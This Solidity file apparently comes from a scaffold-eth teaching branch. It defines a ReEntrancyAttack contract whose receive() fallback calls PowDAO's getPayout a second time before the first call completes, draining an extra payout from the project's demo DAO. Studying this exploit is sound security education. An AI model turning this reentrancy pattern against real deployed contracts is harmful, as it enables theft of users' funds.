// Code snippets from scaffoth-eth reentrancy-ex branch

pragma solidity >=0.6.0 <0.7.0;

import "./PowDAO.sol";
import "hardhat/console.sol";

contract ReEntrancyAttack {
    event Withdraw(address sender, uint256 amount);
    PowDAO powdao;
    bool hasAttacked;

    constructor(address payable contractAddress) public { 
        hasAttacked = false;
        powdao = PowDAO(contractAddress);
        console.log(contractAddress.balance);
    }

    function deposit() public payable {
        powdao.deposit{value:msg.value}();
    }

    function withdraw() public {
        console.log("Withdrawing from PowDAO with gas ", gasleft());
        powdao.getPayout(address(this));
    }

    function submitProposal() public {
        powdao.submitProposal(.01*10**18, "test reentrancy");
    }

    receive() external payable {
        console.log("Not attacked yet with gas ", gasleft());
        if(!hasAttacked){
            console.log("Withdrawing from powdao");
            powdao.getPayout(address(this));
            hasAttacked = true;
        }
        console.log("Done attacking");
    }
}